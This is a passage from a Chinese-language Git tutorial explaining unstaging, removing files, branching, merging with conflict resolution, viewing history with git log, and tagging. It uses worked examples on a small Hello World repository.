<p>现在你就完成了整个快照的流程 ——改些文件，然后用 <code>git add</code> 将要提交的改动提交到缓存， 用 <code>git status</code> 和 <code>git diff</code> 看看你都改了啥，最后 <code>git commit</code> 永久地保存快照。</p>
<p><strong>简而言之</strong>，执行 <code>git commit</code> 记录缓存区的快照。如果需要的话，这个快照可以用来做比较、共享以及恢复。</p>
<h2 id="git_reset_HEAD_取消缓存已缓存的内容"><code>git reset HEAD</code> 取消缓存已缓存的内容</h2><p><a href="http://git-scm.com/docs/git-reset" target="_blank" rel="external">文档</a>   </p>
<p><a href="http://git-scm.com/book/en/Git-Basics-Undoing-Things#Unstaging-a-Staged-File" target="_blank" rel="external">书</a> </p>
<p><code>git reset</code> 可能是人类写的最费解的命令了。 我用 Git 有些年头了，甚至还写了本书，但有的时候还是会搞不清它会做什么。 所以，我只说三个明确的，通常有用的调用。请你跟我一样尽管用它 —— 因为它可以很有用。</p>
<p>在此例中，我们可以用它来将不小心缓存的东东取消缓存。假设你修改了两个文件，想要将它们记录到两个不同的提交中去。 你应该缓存并提交一个，再缓存并提交另外一个。如果你不小心两个都缓存了，那要如何才能<em>取消</em>缓存呢？ 你可以用 <code>git reset HEAD -- file</code>。 技术上说，在这里你不需要使用 <code>--</code> —— 它用来告诉 Git 这时你已经不再列选项，剩下的是文件路径了。 不过养成使用它分隔选项与路径的习惯很重要，即使在你可能并不需要的时候。</p>
<p>好，让我们看看取消缓存是什么样子的。这里我们有两个最近提交之后又有所改动的文件。我们将两个都缓存，并取消缓存其中一个。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git status -s&#10; M README&#10; M hello.rb&#10;$ git add .&#10;$ git status -s&#10;M  README&#10;M  hello.rb&#10;$ git reset HEAD -- hello.rb &#10;Unstaged changes after reset:&#10;M hello.rb&#10;$ git status -s&#10;M  README&#10; M hello.rb</span><br></pre></td></tr></table></figure>
<p>现在你执行 <code>git commit</code> 将只记录 <code>README</code> 文件的改动，并不含现在并不在缓存中的 <code>hello.rb</code>。</p>
<p>如果你好奇，它实际的操作是将该文件在“索引”中的校验和重置为最近一次提交中的值。 <code>git add</code> 会计算一个文件的校验和，将它添加到“索引”中， 而 <code>git reset HEAD</code> 将它改写回原先的，从而取消缓存操作。</p>
<p>如果你想直接执行 <code>git unstage</code>，你可以在 Git 中配置个别名。 执行 <code>git config --global alias.unstage &quot;reset HEAD&quot;</code> 即可。 一旦执行完它，你就可以直接用 <code>git unstage [file]</code> 作为代替了。</p>
<p>如果你忘了取消缓存的命令，Git 的常规 <code>git status</code> 输出的提示会很有帮助。 例如，在你有已缓存的文件时，如果你不带 <code>-s</code> 执行 <code>git status</code>，它将告诉你怎样取消缓存：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git status&#10;# On branch master&#10;# Changes to be committed:&#10;#   (use &#34;git reset HEAD &#60;file&#62;...&#34; to unstage)&#10;#&#10;#   modified:   README&#10;#   modified:   hello.rb&#10;#</span><br></pre></td></tr></table></figure>
<p><strong>简而言之</strong>，执行 <code>git reset HEAD</code> 以取消之前 <code>git add</code> 添加，但不希望包含在下一提交快照中的缓存。</p>
<h2 id="git_rm_将文件从缓存区移除"><code>git rm</code> 将文件从缓存区移除</h2><p><a href="http://git-scm.com/docs/git-rm" target="_blank" rel="external">文档</a>   </p>
<p><a href="http://git-scm.com/book/en/Git-Basics-Recording-Changes-to-the-Repository#Removing-Files" target="_blank" rel="external">书</a></p>
<p><code>git rm</code> 会将条目从缓存区中移除。这与 <code>git reset HEAD</code> 将条目取消缓存是有区别的。 “取消缓存”的意思就是将缓存区恢复为我们做出修改之前的样子。 在另一方面，<code>git rm</code> 则将该文件彻底从缓存区踢出，因此它不再下一个提交快照之内，进而有效地删除它。</p>
<p>默认情况下，<code>git rm file</code> 会将文件从缓存区和你的硬盘中（工作目录）删除。 如果要在工作目录中留着该文件，可以使用 <code>git rm --cached</code></p>
<h3 id="git_mv_git_rm_-cached_orig;_mv_orig_new;_git_add_new"><code>git mv git rm --cached orig; mv orig new; git add new</code></h3><p>不像绝大多数其他版本控制系统，Git 并不记录记录文件重命名。它反而只记录快照，并对比快照以找到有啥文件可能被重命名了。 如果一个文件从更新中删除了，而在下次快照中新添加的另一个文件的内容与它很相似，Git 就知道这极有可能是个重命名。 因此，虽然有 <code>git mv</code> 命令，但它有点多余 —— 它做得所有事情就是 <code>git rm --cached</code>， 重命名磁盘上的文件，然后再执行 <code>git add</code> 把新文件添加到缓存区。 你并不需要用它，不过如果觉得这样容易些，尽管用吧。</p>
<p>我自己并不使用此命令的普通形式 —— 删除文件。通常直接从硬盘删除文件，然后执行 <code>git commit -a</code> 会简单些。 它会自动将删除的文件从索引中移除。</p>
<p><strong>简而言之</strong>， 执行 <code>git rm</code> 来删除 Git 追踪的文件。它还会删除你的工作目录中的相应文件。</p>
<h1 id="分支与合并">分支与合并</h1><p><a href="http://git-scm.com/book/en/Git-Branching" target="_blank" rel="external">书</a></p>
<p>分支是我最喜欢的 Git 特性之一。如果你用过其他版本控制系统，把你所知的分支给忘记，倒可能更有帮助些 —— 事实上，以我们使用分支的方式，把 Git 的分支看作 <em>上下文</em> 反而更合适。 当你检出分支时，你可以在两三个不同的分支之间来回切换。</p>
<p><strong>简而言之</strong>，你可以执行 <code>git branch (branchname)</code> 来创建分支， 使用 <code>git checkout (branchname)</code> 命令切换到该分支，在该分支的上下文环境中， 提交快照等，之后可以很容易地来回切换。当你切换分支的时候，Git 会用该分支的最后提交的快照替换你的工作目录的内容， 所以多个分支不需要多个目录。使用 <code>git merge</code> 来合并分支。你可以多次合并到统一分支， 也可以选择在合并之后直接删除被并入的分支。</p>
<h2 id="git_branch_列出、创建与管理工作上下文"><code>git branch</code> 列出、创建与管理工作上下文</h2><p><a href="http://git-scm.com/docs/git-branch" target="_blank" rel="external">文档</a>   </p>
<p><a href="http://git-scm.com/book/en/Git-Branching-What-a-Branch-Is" target="_blank" rel="external">书</a> </p>
<h2 id="git_checkout_切换到新的分支上下文"><code>git checkout</code> 切换到新的分支上下文</h2><p><a href="http://git-scm.com/docs/git-checkout" target="_blank" rel="external">文档</a>   </p>
<p><a href="http://git-scm.com/book/en/Git-Branching-Basic-Branching-and-Merging" target="_blank" rel="external">书</a> </p>
<p><code>git branch</code> 命令是 Git 中的通用分支管理工具，可以通过它完成多项任务。 我们先说你会用到的最多的命令 —— 列出分支、创建分支和删除分支。 我们还会介绍用来切换分支的 <code>git checkout</code> 命令。</p>
<h3 id="git_branch_列出可用的分支"><code>git branch</code> 列出可用的分支</h3><p>没有参数时，<code>git branch</code> 会列出你在本地的分支。你所在的分支的行首会有个星号作标记。 如果你开启了<a href="http://git-scm.com/book/en/Customizing-Git-Git-Configuration#Colors-in-Git" target="_blank" rel="external">彩色模式</a>，当前分支会用绿色显示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch&#10;* master</span><br></pre></td></tr></table></figure>
<p>此例的意思就是，我们有一个叫做“master”的分支，并且该分支是当前分支。 当你执行 <code>git init</code> 的时候，缺省情况下 Git 就会为你创建“master”分支。 但是这名字一点特殊意味都没有 —— 事实上你并不非得要一个叫做“master”的分支。 不过由于它是缺省分支名的缘故，绝大部分项目都有这个分支。</p>
<h3 id="git_branch_(branchname)_创建新分支"><code>git branch (branchname)</code> 创建新分支</h3><p>我们动手创建一个分支，并切换过去。执行 <code>git branch (branchname)</code> 即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch testing&#10;$ git branch&#10;* master&#10;  testing</span><br></pre></td></tr></table></figure>
<p>现在我们可以看到，有了一个新分支。当你以此方式在上次提交更新之后创建了新分支，如果后来又有更新提交， 然后又切换到了“testing”分支，Git 将还原你的工作目录到你创建分支时候的样子 —— 你可以把它看作一个记录你当前进度的书签。让我们实际运用看看 —— 我们用 <code>git checkout (branch)</code> 切换到我们要修改的分支。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ls&#10;README   hello.rb&#10;$ echo &#39;test content&#39; &#62; test.txt&#10;$ echo &#39;more content&#39; &#62; more.txt&#10;$ git add *.txt&#10;$ git commit -m &#39;added two files&#39;&#10;[master 8bd6d8b] added two files&#10; 2 files changed, 2 insertions(+), 0 deletions(-)&#10; create mode 100644 more.txt&#10; create mode 100644 test.txt&#10;$ ls&#10;README   hello.rb more.txt test.txt&#10;$ git checkout testing&#10;Switched to branch &#39;testing&#39;&#10;$ ls&#10;README   hello.rb</span><br></pre></td></tr></table></figure>
<p>当我们切换到“测试”分支的时候，我们添加的新文件被移除了。切换回“master”分支的时候，它们有重新出现了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ls&#10;README   hello.rb&#10;$ git checkout master&#10;Switched to branch &#39;master&#39;&#10;$ ls&#10;README   hello.rb more.txt test.txt</span><br></pre></td></tr></table></figure>
<h3 id="git_checkout_-b_(branchname)_创建新分支，并立即切换到它"><code>git checkout -b (branchname)</code> 创建新分支，并立即切换到它</h3><p>通常情况下，你会更希望立即切换到新分支，从而在该分支中操作，然后当此分支的开发日趋稳定时， 将它合并到稳定版本的分支（例如“master”）中去。 执行 <code>git branch newbranch; git checkout newbranch</code> 也很简单， 不过 Git 还为你提供了快捷方式：<code>git checkout -b newbranch</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch&#10;* master&#10;$ ls&#10;README   hello.rb more.txt test.txt&#10;$ git checkout -b removals&#10;Switched to a new branch &#39;removals&#39;&#10;$ git rm more.txt &#10;rm &#39;more.txt&#39;&#10;$ git rm test.txt &#10;rm &#39;test.txt&#39;&#10;$ ls&#10;README   hello.rb&#10;$ git commit -am &#39;removed useless files&#39;&#10;[removals 8f7c949] removed useless files&#10; 2 files changed, 0 insertions(+), 2 deletions(-)&#10; delete mode 100644 more.txt&#10; delete mode 100644 test.txt&#10;$ git checkout master&#10;Switched to branch &#39;master&#39;&#10;$ ls&#10;README   hello.rb more.txt test.txt</span><br></pre></td></tr></table></figure>
<p>如你所见，我们创建了一个分支，在该分支的上下文中移除了一些文件，然后切换回我们的主分支，那些文件又回来了。 使用分支将工作切分开来，从而让我们能够在不同上下文中做事，并来回切换。</p>
<p>创建新分支，在其中完成一部分工作，完成之后将它合并到主分支并删除。你会觉得这很方便，因为这么做很快很容易。 如此，当你觉得这部分工作并不靠谱，舍弃它很容易。并且，如果你必须回到稳定分支做些事情， 也可以很方便地这个独立分支的工作先丢在一边，完成要事之后再切换回来。</p>
<h3 id="git_branch_-d_(branchname)_删除分支"><code>git branch -d (branchname)</code> 删除分支</h3><p>假设我们要删除一个分支（比如上例中的“testing”分支，该分支没啥特殊的内容了）， 可以执行 <code>git branch -d (branch)</code> 把它删掉。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch&#10;* master&#10;  testing&#10;$ git branch -d testing&#10;Deleted branch testing (was 78b2670).&#10;$ git branch&#10;* master</span><br></pre></td></tr></table></figure>
<p><strong>简而言之</strong> 使用 <code>git branch</code> 列出现有的分支、创建新分支以及删除不必要或者已合并的分支。</p>
<h2 id="git_merge_将分支合并到你的当前分支"><code>git merge</code> 将分支合并到你的当前分支</h2><p><a href="http://git-scm.com/docs/git-merge" target="_blank" rel="external">docs</a>   </p>
<p><a href="http://git-scm.com/book/en/Git-Branching-Basic-Branching-and-Merging#Basic-Merging" target="_blank" rel="external">book</a> </p>
<p>一旦某分支有了独立内容，你终究会希望将它合并回到你的主分支。 你可以使用 <code>git merge</code> 命令将任何分支合并到当前分支中去。 我们那上例中的“removals”分支为例。假设我们创建了一个分支，移除了一些文件，并将它提交到该分支， 其实该分支是与我们的主分支（也就是“master”）独立开来的。 要想将这些移除操作包含在主分支中，你可以将“removals”分支合并回去。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch&#10;* master&#10;  removals&#10;$ ls&#10;README   hello.rb more.txt test.txt&#10;$ git merge removals&#10;Updating 8bd6d8b..8f7c949&#10;Fast-forward&#10; more.txt |    1 -&#10; test.txt |    1 -&#10; 2 files changed, 0 insertions(+), 2 deletions(-)&#10; delete mode 100644 more.txt&#10; delete mode 100644 test.txt&#10;$ ls&#10;README   hello.rb</span><br></pre></td></tr></table></figure>
<h3 id="更多复杂合并">更多复杂合并</h3><p>当然，合并并不仅仅是简单的文件添加、移除的操作，Git 也会合并修改 —— 事实上，它很会合并修改。 举例，我们看看在某分支中编辑某个文件，然后在另一个分支中把它的名字改掉再做些修改， 最后将这俩分支合并起来。你觉得会变成一坨 shi？我们试试看。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch&#10;* master&#10;$ cat hello.rb &#10;class HelloWorld&#10;  def self.hello&#10;    puts &#34;Hello World&#34;&#10;  end&#10;end&#10;&#10;HelloWorld.hello</span><br></pre></td></tr></table></figure>
<p>首先，我们创建一个叫做“change_class”的分支，切换过去，从而将重命名类等操作独立出来。我们将类名从 “HelloWorld” 改为 “HiWorld”。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -b change_class&#10;M hello.rb&#10;Switched to a new branch &#39;change_class&#39;&#10;$ vim hello.rb &#10;$ head -1 hello.rb &#10;class HiWorld&#10;$ git commit -am &#39;changed the class name&#39;&#10;[change_class 3467b0a] changed the class name&#10; 1 files changed, 2 insertions(+), 4 deletions(-)</span><br></pre></td></tr></table></figure>
<p>然后，将重命名类操作提交到 “change_class” 分支中。 现在，假如切换回 “master” 分支我们可以看到类名恢复到了我们切换到 “change_class” 分支之前的样子。 现在，再做些修改（即代码中的输出），同时将文件名从 <code>hello.rb</code> 改为 <code>ruby.rb</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout master&#10;Switched to branch &#39;master&#39;&#10;$ git mv hello.rb ruby.rb&#10;$ vim ruby.rb &#10;$ git diff&#10;diff --git a/ruby.rb b/ruby.rb&#10;index 2aabb6e..bf64b17 100644&#10;--- a/ruby.rb&#10;+++ b/ruby.rb&#10;@@ -1,7 +1,7 @@&#10; class HelloWorld&#10;&#10;   def self.hello&#10;-    puts &#34;Hello World&#34;&#10;+    puts &#34;Hello World from Ruby&#34;&#10;   end&#10;&#10; end&#10;$ git commit -am &#39;added from ruby&#39;&#10;[master b7ae93b] added from ruby&#10; 1 files changed, 1 insertions(+), 1 deletions(-)&#10; rename hello.rb =&#62; ruby.rb (65%)</span><br></pre></td></tr></table></figure>
<p>现在这些改变已经记录到我的 “master” 分支了。请注意，这里类名还是 “HelloWorld”，而不是 “HiWorld”。 然后我想将类名的改变合并过来，我把 “change_class” 分支合并过来就行了。 但是，我已经将文件名都改掉了，Git 知道该怎么办么？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch&#10;  change_class&#10;* master&#10;$ git merge change_class&#10;Renaming hello.rb =&#62; ruby.rb&#10;Auto-merging ruby.rb&#10;Merge made by recursive.&#10; ruby.rb |    6 ++----&#10; 1 files changed, 2 insertions(+), 4 deletions(-)&#10;$ cat ruby.rb&#10;class HiWorld&#10;  def self.hello&#10;    puts &#34;Hello World from Ruby&#34;&#10;  end&#10;end&#10;&#10;HiWorld.hello</span><br></pre></td></tr></table></figure>
<p>不错，它就是发现了。请注意，在这部操作，我没有遇到合并冲突，并且文件已经重命名、类名也换掉了。挺酷。</p>
<h3 id="合并冲突">合并冲突</h3><p>那么，Git 合并很有魔力，我们再也不用处理合并冲突了，对吗？不太确切。 不同分支中修改了相同区块的代码，电脑自己猜不透神马的情况下，冲突就摆在我们面前了。 我们看看两个分支中改了同一行代码的例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch&#10;* master&#10;$ git checkout -b fix_readme&#10;Switched to a new branch &#39;fix_readme&#39;&#10;$ vim README &#10;$ git commit -am &#39;fixed readme title&#39;&#10;[fix_readme 3ac015d] fixed readme title&#10; 1 files changed, 1 insertions(+), 1 deletions(-)</span><br></pre></td></tr></table></figure>
<p>我们在某分支中修改了 README 文件中的一行，并提交了。我们再在 “master” 分支中对同个文件的同一行内容作不同的修改。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout master&#10;Switched to branch &#39;master&#39;&#10;$ vim README &#10;$ git commit -am &#39;fixed readme title differently&#39;&#10;[master 3cbb6aa] fixed readme title differently&#10; 1 files changed, 1 insertions(+), 1 deletions(-)</span><br></pre></td></tr></table></figure>
<p>有意思的来了 —— 我们将前一个分支合并到 “master” 分支，一个合并冲突就出现了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git merge fix_readme&#10;Auto-merging README&#10;CONFLICT (content): Merge conflict in README&#10;Automatic merge failed; fix conflicts and then commit the result.&#10;$ cat README &#10;&#60;&#60;&#60;&#60;&#60;&#60;&#60; HEAD&#10;Many Hello World Examples&#10;=======&#10;Hello World Lang Examples&#10;&#62;&#62;&#62;&#62;&#62;&#62;&#62; fix_readme&#10;&#10;This project has examples of hello world in&#10;nearly every programming language.</span><br></pre></td></tr></table></figure>
<p>你可以看到，Git 在产生合并冲突的地方插入了标准的与 Subversion 很像的合并冲突标记。 轮到我们去解决这些冲突了。在这里我们就手动把它解决。如果你要 Git 打开一个图形化的合并工具， 可以看看 <a href="http://git-scm.com/docs/git-mergetool" target="_blank" rel="external">git 合并工具</a> （比如 kdiff3、emerge、p4merge 等）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim README   here I&#39;m fixing the conflict&#10;$ git diff&#10;diff --cc README&#10;index 9103e27,69cad1a..0000000&#10;--- a/README&#10;+++ b/README&#10;@@@ -1,4 -1,4 +1,4 @@@&#10;- Many Hello World Examples&#10; -Hello World Lang Examples&#10;++Many Hello World Lang Examples&#10;&#10;  This project has examples of hello world in</span><br></pre></td></tr></table></figure>
<p>在 Git 中，处理合并冲突的时候有个很酷的提示。 如果你执行 <code>git diff</code>，就像我演示的这样，它会告诉你冲突的两方，和你是如何解决的。 现在是时候把它标记为已解决了。在 Git 中，我们可以用 <code>git add</code> —— 要告诉 Git 文件冲突已经解决，你必须把它写入缓存区。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git status -s&#10;UU README&#10;$ git add README &#10;$ git status -s&#10;M  README&#10;$ git commit &#10;[master 8d585ea] Merge branch &#39;fix_readme&#39;</span><br></pre></td></tr></table></figure>
<p>现在我们成功解决了合并中的冲突，并提交了结果</p>
<p><strong>简而言之</strong> 使用 <code>git merge</code> 将另一个分支并入当前的分支中去。 Git 会自动以最佳方式将两个不同快照中独特的工作合并到一个新快照中去。</p>
<h2 id="git_log_显示一个分支中提交的更改记录"><code>git log</code> 显示一个分支中提交的更改记录</h2><p><a href="http://git-scm.com/docs/git-log" target="_blank" rel="external">文档</a>   </p>
<p><a href="http://git-scm.com/book/en/Git-Tools-Revision-Selection#Commit-Ranges" target="_blank" rel="external">书</a> </p>
<p>到目前为止，我们已经提交快照到项目中，在不同的各自分离的上下文中切换， 但假如我们忘了自己是如何到目前这一步的那该怎么办？或者假如我们想知道此分支与彼分支到底有啥区别？ Git 提供了一个告诉你使你达成当前快照的所有提交消息的工具，叫做 <code>git log</code>。</p>
<p>要理解日志（log）命令，你需要了解当执行 <code>git commit</code> 以存储一个快照的时候，都有啥信息被保存了。 除了文件详单、提交消息和提交者的信息，Git 还保存了你的此次提交所基于的快照。 也就是，假如你克隆了一个项目，你是在什么快照的基础上做的修改而得到新保存的快照的？ 这有益于为项目进程提供上下文，使 Git 能够弄明白谁做了什么改动。 如果 Git 有你的快照所基于的快照的话，它就能自动判断你都改变了什么。而新提交所基于的提交，被称作新提交的“父亲”。</p>
<p>某分支的按时间排序的“父亲”列表，当你在该分支时，可以执行 <code>git log</code> 以查看。 例如，如果我们在本章中操作的 Hello World 项目中执行 <code>git log</code>，我们可以看到已提交的消息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git log&#10;commit 8d585ea6faf99facd39b55d6f6a3b3f481ad0d3d&#10;Merge: 3cbb6aa 3ac015d&#10;Author: Scott Chacon &#60;schacon@gmail.com&#62;&#10;Date:   Fri Jun 4 12:59:47 2010 +0200&#10;&#10;    Merge branch &#39;fix_readme&#39;&#10;&#10;    Conflicts:&#10;        README&#10;&#10;commit 3cbb6aae5c0cbd711c098e113ae436801371c95e&#10;Author: Scott Chacon &#60;schacon@gmail.com&#62;&#10;Date:   Fri Jun 4 12:58:53 2010 +0200&#10;&#10;    fixed readme title differently&#10;&#10;commit 3ac015da8ade34d4c7ebeffa2053fcac33fb495b&#10;Author: Scott Chacon &#60;schacon@gmail.com&#62;&#10;Date:   Fri Jun 4 12:58:36 2010 +0200&#10;&#10;    fixed readme title&#10;&#10;commit 558151a95567ba4181bab5746bc8f34bd87143d6&#10;Merge: b7ae93b 3467b0a&#10;Author: Scott Chacon &#60;schacon@gmail.com&#62;&#10;Date:   Fri Jun 4 12:37:05 2010 +0200&#10;&#10;    Merge branch &#39;change_class&#39;&#10;...</span><br></pre></td></tr></table></figure>
<p>我们可以用 <code>--oneline</code> 选项来查看历史记录的紧凑简洁的版本。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git log --oneline&#10;8d585ea Merge branch &#39;fix_readme&#39;&#10;3cbb6aa fixed readme title differently&#10;3ac015d fixed readme title&#10;558151a Merge branch &#39;change_class&#39;&#10;b7ae93b added from ruby&#10;3467b0a changed the class name&#10;17f4acf first commit</span><br></pre></td></tr></table></figure>
<p>这告诉我们的是，此项目的开发历史。如果提交消息描述性很好，这就能为我们提供关于有啥改动被应用、或者影响了当前快照的状态、以及这快照里头都有啥。</p>
<p>我们还可以用它的十分有帮助的 <code>--graph</code> 选项，查看历史中什么时候出现了分支、合并。以下为相同的命令，开启了拓扑图选项：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git log --oneline --graph&#10;*   8d585ea Merge branch &#39;fix_readme&#39;&#10;|\&#10;| * 3ac015d fixed readme title&#10;* | 3cbb6aa fixed readme title differently&#10;|/&#10;*   558151a Merge branch &#39;change_class&#39;&#10;|\&#10;| * 3467b0a changed the class name&#10;* | b7ae93b added from ruby&#10;|/&#10;* 17f4acf first commit</span><br></pre></td></tr></table></figure>
<p>现在我们可以更清楚明了地看到何时工作分叉、又何时归并。 这对查看发生了什么、应用了什么改变很有帮助，并且极大地帮助你管理你的分支。 让我们创建一个分支，在里头做些事情，然后切回到主分支，也做点事情，然后看看 <code>log</code> 命令是如何帮助我们理清这俩分支上都发生了啥的。</p>
<p>首先我们创建一个分支，来添加 Erlang 编程语言的 Hello World 示例 —— 我们想要在一个分支里头做这个，以避免让可能还不能工作的代码弄乱我们的稳定分支。 这样就可以切来切去，片叶不沾身。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -b erlang&#10;Switched to a new branch &#39;erlang&#39;&#10;$ vim erlang_hw.erl&#10;$ git add erlang_hw.erl &#10;$ git commit -m &#39;added erlang&#39;&#10;[erlang ab5ab4c] added erlang&#10; 1 files changed, 5 insertions(+), 0 deletions(-)&#10; create mode 100644 erlang_hw.erl</span><br></pre></td></tr></table></figure>
<p>由于我们玩函数式编程很开心，以至于沉迷其中，又在“erlang”分支中添加了一个 Haskell 的示例程序。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim haskell.hs&#10;$ git add haskell.hs &#10;$ git commit -m &#39;added haskell&#39;&#10;[erlang 1834130] added haskell&#10; 1 files changed, 4 insertions(+), 0 deletions(-)&#10; create mode 100644 haskell.hs</span><br></pre></td></tr></table></figure>
<p>最后，我们决定还是把 Ruby 程序的类名改回原先的样子。与其创建另一个分支，我们可以返回主分支，改变它，然后直接提交。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout master&#10;Switched to branch &#39;master&#39;&#10;$ ls&#10;README  ruby.rb&#10;$ vim ruby.rb &#10;$ git commit -am &#39;reverted to old class name&#39;&#10;[master 594f90b] reverted to old class name&#10; 1 files changed, 2 insertions(+), 2 deletions(-)</span><br></pre></td></tr></table></figure>
<p>现在假设我们有段时间不做这个项目了，我们做别的去了。 当我们回来的时候，我们想知道“erlang”分支都是啥，而主分支的进度又是怎样。 仅仅看分支的名字，我们是无从知道自己还在里面有 Haskell 的改动的，但是用 <code>git log</code> 我们就可以。 如果你在命令行中提供一个分支名字，它就会显示该分支历史中“可及”的提交，即从该分支创立起可追溯的影响了最终的快照的提交。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git log --oneline erlang&#10;1834130 added haskell&#10;ab5ab4c added erlang&#10;8d585ea Merge branch &#39;fix_readme&#39;&#10;3cbb6aa fixed readme title differently&#10;3ac015d fixed readme title&#10;558151a Merge branch &#39;change_class&#39;&#10;b7ae93b added from ruby&#10;3467b0a changed the class name&#10;17f4acf first commit</span><br></pre></td></tr></table></figure>
<p>如此，我们很容易就看到分支里头还包括了 Haskell 代码（高亮显示了）。 更酷的是，我们很容易地告诉 Git，我们只对某个分支中可及的提交感兴趣。换句话说，某分支中与其他分支相比唯一的提交。</p>
<p>在此例中，如果我们想要合并“erlang”分支，我们需要看当合并的时候，都有啥提交会作用到我们的快照上去。 我们告诉 Git 的方式是，在不想要看到的分支前放一个 <code>^</code>。 例如，如果我们想要看“erlang”分支中但不在主分支中的提交，我们可以用 <code>erlang ^master</code>，或者反之。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git log --oneline erlang ^master&#10;1834130 added haskell&#10;ab5ab4c added erlang&#10;$ git log --oneline master ^erlang&#10;594f90b reverted to old class name</span><br></pre></td></tr></table></figure>
<p>这为我们提供了一个良好的、简易的分支管理工具。它使我们能够非常容易地查看对某个分支唯一的提交，从而知道我们缺少什么，以及当我们要合并时，会有什么被合并进去。</p>
<p><strong>简而言之</strong> 使用 <code>git log</code> 列出促成当前分支目前的快照的提交历史记录。这使你能够看到项目是如何到达现在的状况的。</p>
<h2 id="git_tag_给历史记录中的某个重要的一点打上标签"><code>git tag</code> 给历史记录中的某个重要的一点打上标签</h2><p><a href="http://git-scm.com/docs/git-tag" target="_blank" rel="external">文档</a>   </p>
<p><a href="http://git-scm.com/book/en/Git-Basics-Tagging" target="_blank" rel="external">书</a> </p>
<p>如果你达到一个重要的阶段，并希望永远记住那个特别的提交快照，你可以使用 <code>git tag</code> 给它打上标签。 该 <code>tag</code> 命令基本上会给该特殊提交打上永久的书签，从而使你在将来能够用它与其他提交比较。 通常，你会在切取一个发布版本或者交付一些东西的时候打个标签。</p>
<p>比如说，我们想为我们的 Hello World 项目发布一个“1.0”版本。 我们可以用 <code>git tag -a v1.0</code> 命令给最新一次提交打上（<code>HEAD</code>）“v1.0”的标签。 <code>-a</code> 选项意为“创建一个带注解的标签”，从而使你为标签添加注解。绝大部分时候都会这么做的。 不用 <code>-a</code> 选项也可以执行的，但它不会记录这标签是啥时候打的，谁打的，也不会让你添加个标签的注解。 我推荐一直创建带注解的标签。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git tag -a v1.0</span><br></pre></td></tr></table></figure>
<p>当你执行 <code>git tag -a</code> 命令时，Git 会打开你的编辑器，让你写一句标签注解，就像你给提交写注解一样。</p>
<p>现在，注意当我们执行 <code>git log --decorate</code> 时，我们可以看到我们的标签了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git log --oneline --decorate --graph&#10;* 594f90b (HEAD, tag: v1.0, master) reverted to old class name&#10;*   8d585ea Merge branch &#39;fix_readme&#39;&#10;|\&#10;| * 3ac015d (fix_readme) fixed readme title&#10;* | 3cbb6aa fixed readme title differently&#10;|/&#10;*   558151a Merge branch &#39;change_class&#39;&#10;|\&#10;| * 3467b0a changed the class name&#10;* | b7ae93b added from ruby&#10;|/&#10;* 17f4acf first commit</span><br></pre></td></tr></table></figure>
<p>如果我们有新提交，该标签依然会待在该提交的边上，所以我们已经给那个特定快照永久打上标签，并且能够将它与未来的快照做比较。</p>
